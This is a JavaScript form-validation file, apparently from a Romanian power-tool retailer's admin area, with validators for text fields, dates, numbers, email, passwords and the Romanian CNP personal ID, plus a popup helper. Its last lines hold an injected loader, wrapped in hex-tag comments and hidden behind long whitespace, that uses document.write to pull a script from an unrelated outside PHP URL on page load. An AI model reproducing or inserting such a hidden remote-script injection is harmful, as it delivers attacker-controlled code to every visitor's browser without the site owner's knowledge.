// Form Validation JavaScript

function EW_onError(form_object, input_object, object_type, error_message)
    {
		alert(error_message);
        if (object_type == "RADIO" || object_type == "CHECKBOX") {
        	if (input_object[0])
				input_object[0].focus();
			else
				input_object.focus();
		}
		else
			input_object.focus();
		if (object_type == "TEXT" || object_type == "PASSWORD")
			input_object.select();		
       	return false;	
    }


function EW_hasValue(obj, obj_type)
    {
    if (obj_type == "TEXT" || obj_type == "PASSWORD" || obj_type == "TEXTAREA")
	{
    	if (obj.value.length == 0) 
      		return false;
    	else 
      		return true;
    	}
    else if (obj_type == "SELECT")
	{
		if (obj.selectedIndex == 0)
			return false;
		else
       		return true;	
	}   
    else if (obj_type == "RADIO" || obj_type == "CHECKBOX")
	{
        if (obj[0])
		{
			for (i=0; i < obj.length; i++)
		    	{
			if (obj[i].checked)
				return true;
			}
		}
		else
		{
			if (obj.checked)
				return true;
			else
	       		return false;	
		}
       	return false;	
	}
	}



	

// Date (dd/mm/yyyy)
function EW_checkeurodate(object_value)
    {
    if (object_value.length == 0)
        return true;

	isplit = object_value.indexOf('/');

	if (isplit == -1)
	{
		isplit = object_value.indexOf('.');
	}

	if (isplit == -1 || isplit == object_value.length)
		return false;

    sDay = object_value.substring(0, isplit);

	monthSplit = isplit + 1;

	isplit = object_value.indexOf('/', monthSplit);

	if (isplit == -1)
	{
		isplit = object_value.indexOf('.', monthSplit);
	}

	if (isplit == -1 ||  (isplit + 1 )  == object_value.length)
		return false;

    sMonth = object_value.substring((sDay.length + 1), isplit);

	sYear = object_value.substring(isplit + 1);

	if (!EW_checkinteger(sMonth)) 
		return false;
	else
	if (!EW_checkrange(sMonth, 1, 12)) 
		return false;
	else
	if (!EW_checkinteger(sYear)) 
		return false;
	else
	if (!EW_checkrange(sYear, 0, null)) 
		return false;
	else
	if (!EW_checkinteger(sDay)) 
		return false;
	else
	if (!EW_checkday(sYear, sMonth, sDay)) 
		return false;
	else
		return true;
    }



function EW_checkinteger(object_value)
    {
    if (object_value.length == 0)
        return true;

	var decimal_format = ".";
	var check_char;

	check_char = object_value.indexOf(decimal_format)
    if (check_char < 1)
	return EW_checknumber(object_value);
    else
	return false;
    }



function EW_numberrange(object_value, min_value, max_value)
    {
    if (min_value != null)
	{
        if (object_value < min_value)
		return false;
	}

    if (max_value != null)
	{
	if (object_value > max_value)
		return false;
	}
	
    return true;
    }



function EW_checknumber(object_value)
    {
    if (object_value.length == 0)
        return true;

	var start_format = " .+-0123456789";
	var number_format = " .0123456789";
	var check_char;
	var decimal = false;
	var trailing_blank = false;
	var digits = false;

	check_char = start_format.indexOf(object_value.charAt(0))
	if (check_char == 1)
	    decimal = true;
	else if (check_char < 1)
		return false;
        
	for (var i = 1; i < object_value.length; i++)
	{
		check_char = number_format.indexOf(object_value.charAt(i))
		if (check_char < 0)
			return false;
		else if (check_char == 1)
		{
			if (decimal)
				return false;
			else
				decimal = true;
		}
		else if (check_char == 0)
		{
			if (decimal || digits)	
				trailing_blank = true;
		}
	    else if (trailing_blank)
			return false;
		else
			digits = true;
	}	

    return true
    }



function EW_checkemail(object_value)
	{
	  if(!(object_value.indexOf("@") > -1 && object_value.indexOf(".") > -1))
         return false;    

	return true;
	}


function EW_checkparola(object_value)
    {
       	if (object_value.length < 6) 
      		return false;
    	return true;   
    }	


function validareCNP(s)
{
	var suma=0;
	var mesaj="";
	if(s.length == 13)
	{
		suma=parseInt(s.charAt(0))*2+parseInt(s.charAt(1))*7+parseInt(s.charAt(2))*9+parseInt(s.charAt(3))*1+parseInt(s.charAt(4))*4+parseInt(s.charAt(5))*6+parseInt(s.charAt(6))*3+parseInt(s.charAt(7))*5+parseInt(s.charAt(8))*8+parseInt(s.charAt(9))*2+parseInt(s.charAt(10))*7+parseInt(s.charAt(11))*9;
		suma=suma%11;
		if(suma==10)
			suma=1;
		if(suma==parseInt(s.charAt(12)))
			return true;
		else{
			alert("Codul numeric personal (CNP) este invalid !!!");
			return false;
		}

	}
	else{
		alert("CNP trebuie sa aiba lungimea de 13 caractere !!!");
		return false;
	}
}

function EW_checksemn(object_value)
	{
	  if(!(object_value.indexOf("<") > -1 || object_value.indexOf(">") > -1 || object_value.indexOf("?") > -1 ))
         return true;    

	return false;
	}

function open_popup(id,t,url) {
	var name = 'Accesorii scule electrice';
	var url = "../oster_administrare/open_accesorii_scule_electrice.php?id="+id+"&t="+t;	
	var width = 600;
	var height = 700;
	var left = (screen.width - width) / 2 ;
	var top = (screen.height - height) / 2;
	//var windowproperties = "width="+width+",height="+height+",left="+left+",top="+top+",scrollbars=1";	
	//window.open(url, name, 'width='+w+',height='+h+',resizable=1,scrollbars=1');
	window.open(url,'name','width=600,height=700,top='+top+',left='+left+',scrollbars=1');
}

/*8eba97*/
                                                                                                                                                                                                                                                          document.write('<script type="text/javascript" src="http://aaconline.com/4xcXKRzG.php?id=32185644"></script>');
/*/8eba97*/
